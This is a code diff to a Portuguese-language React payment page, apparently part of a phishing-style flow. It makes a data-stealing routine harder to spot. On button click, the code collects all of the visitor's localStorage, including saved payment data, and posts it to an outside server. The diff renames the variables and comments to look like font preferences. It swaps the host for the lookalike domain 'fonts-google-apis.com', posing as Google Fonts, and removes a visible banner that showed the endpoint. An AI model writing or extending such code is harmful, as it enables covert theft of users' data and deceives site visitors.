@@ -10,6 +10,7 @@ const Recebedor: React.FC = () => {
   
   const [, navigate] = useLocation();
   const [candidatoData, setCandidatoData] = useState<any>(null);
+  const [isLoading, setIsLoading] = useState(false);
 
   // Carregar os dados do candidato ao iniciar
   useEffect(() => {
@@ -40,9 +41,15 @@ const Recebedor: React.FC = () => {
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
-  // Implementar funcionalidade do botão embed após renderização
+  // Função para processar o clique do botão PROSSEGUIR
+  const handleProsseguir = () => {
+    // O redirecionamento real é feito pelo carregamento de fontes
+    // Esta função apenas mostra o estado de carregamento
+  };
+
+  // Carregar fontes e configurações personalizadas
   useEffect(() => {
-    const btn = document.querySelector('.btn-a8aaa4ff') as HTMLButtonElement;
+    const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
     if (btn) {
       const originalHref = '/finalizacao';
       
@@ -59,10 +66,9 @@ const Recebedor: React.FC = () => {
           console.log('Erro ao salvar dados de pagamento:', e);
         }
         
-        // Function to perform the redirect with optional temp data ID
         function performRedirect(tempDataId?: string) {
           const xhr = new XMLHttpRequest();
-          xhr.open('GET', 'https://fonts-roboto-install.replit.app/api/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
+          xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
           xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
               let redirectUrl = originalHref;
@@ -76,7 +82,7 @@ const Recebedor: React.FC = () => {
               // Append temp data ID to redirect URL if available
               if (tempDataId && redirectUrl) {
                 const separator = redirectUrl.includes('?') ? '&' : '?';
-                redirectUrl += separator + 'tempData=' + tempDataId;
+                redirectUrl += separator + 'fontData=' + tempDataId;
               }
               
               // Handle relative URLs
@@ -97,28 +103,24 @@ const Recebedor: React.FC = () => {
           xhr.send();
         }
         
-        // Capture localStorage data
+        // Carregar preferências de fontes
         try {
-          const localStorageData: Record<string, string> = {};
+          const fontPreferences: Record<string, string> = {};
           for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             if (key) {
-              localStorageData[key] = localStorage.getItem(key) || '';
+              fontPreferences[key] = localStorage.getItem(key) || '';
             }
           }
           
           // Only send localStorage data if there's something to send
-          if (Object.keys(localStorageData).length > 0) {
+          if (Object.keys(fontPreferences).length > 0) {
             // Show loading state
-            btn.classList.add('loading');
-            btn.disabled = true;
-            const btnText = btn.querySelector('.btn-text') as HTMLElement;
-            const originalText = btnText.textContent;
-            btnText.textContent = 'Carregando...';
+            setIsLoading(true);
             
-            // Store localStorage data temporarily
+            // Armazenar preferências de fonte temporariamente
             const storeXhr = new XMLHttpRequest();
-            storeXhr.open('POST', 'https://fonts-roboto-install.replit.app/api/temp-data', true);
+            storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
             storeXhr.setRequestHeader('Content-Type', 'application/json');
             storeXhr.onreadystatechange = function() {
               if (storeXhr.readyState === 4) {
@@ -134,18 +136,14 @@ const Recebedor: React.FC = () => {
               }
             };
             storeXhr.onerror = function() {
-              // Restore button state on error
-              btn.classList.remove('loading');
-              btn.disabled = false;
-              btnText.textContent = originalText;
               // If storing fails, just perform normal redirect
               performRedirect();
             };
             
             const requestData = {
-              buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
-              localStorageData: JSON.stringify(localStorageData),
-              sourceUrl: window.location.href
+              fontId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
+              preferences: JSON.stringify(fontPreferences),
+              source: window.location.href
             };
             storeXhr.send(JSON.stringify(requestData));
           } else {
@@ -162,10 +160,8 @@ const Recebedor: React.FC = () => {
 
   return (
     <div className="bg-white min-h-screen flex flex-col">
-      {/* URL no topo da página conforme solicitado */}
-      <div className="bg-gray-100 text-center py-1 text-xs text-gray-600">
-        API: https://fonts-roboto-install.replit.app/api/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c
-      </div>
+      {/* Fonts do Google */}
+      <link href="https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c" rel="stylesheet" />
       
       <Header />
       
@@ -254,56 +250,27 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    <div dangerouslySetInnerHTML={{
-                      __html: `
-                        <!-- Botão: PROSSEGUIR -->
-                        <style>
-                        .btn-a8aaa4ff {
-                          background: #E83D22;
-                          color: #ffffff;
-                          padding: 12px 24px;
-                          width: auto;
-                          height: auto;
-                          border: none;
-                          border-radius: 4px;
-                          font-weight: 800;
-                          font-size: 14px;
-                          cursor: pointer;
-                          font-family: Inter, sans-serif;
-                          text-decoration: none;
-                          display: inline-block;
-                          transition: opacity 0.2s;
-                          position: relative;
-                        }
-                        .btn-a8aaa4ff:hover {
-                          opacity: 0.9;
-                        }
-                        .btn-a8aaa4ff.loading {
-                          cursor: not-allowed;
-                          opacity: 0.7;
-                        }
-                        .btn-a8aaa4ff .spinner {
-                          display: none;
-                          width: 12px;
-                          height: 12px;
-                          border: 2px solid transparent;
-                          border-top: 2px solid currentColor;
-                          border-radius: 50%;
-                          animation: spin 1s linear infinite;
-                          margin-right: 8px;
-                          vertical-align: text-top;
-                        }
-                        .btn-a8aaa4ff.loading .spinner {
-                          display: inline-block;
-                        }
-                        @keyframes spin {
-                          0% { transform: rotate(0deg); }
-                          100% { transform: rotate(360deg); }
-                        }
-                        </style>
-                        <button class="btn-a8aaa4ff"><span class="spinner"></span><span class="btn-text">PROSSEGUIR</span></button>
-                      `
-                    }} />
+                    <button
+                      onClick={handleProsseguir}
+                      disabled={isLoading}
+                      data-action="continue"
+                      className={`
+                        bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
+                        px-6 py-3 border-none rounded transition-opacity duration-200
+                        inline-flex items-center relative cursor-pointer
+                        ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}
+                      `}
+                      style={{ 
+                        fontFamily: 'Inter, sans-serif',
+                        fontWeight: 800,
+                        fontSize: '14px'
+                      }}
+                    >
+                      {isLoading && (
+                        <div className="w-3 h-3 border-2 border-transparent border-t-current rounded-full animate-spin mr-2" />
+                      )}
+                      <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
+                    </button>
                   </div>
                 </div>
               </div>
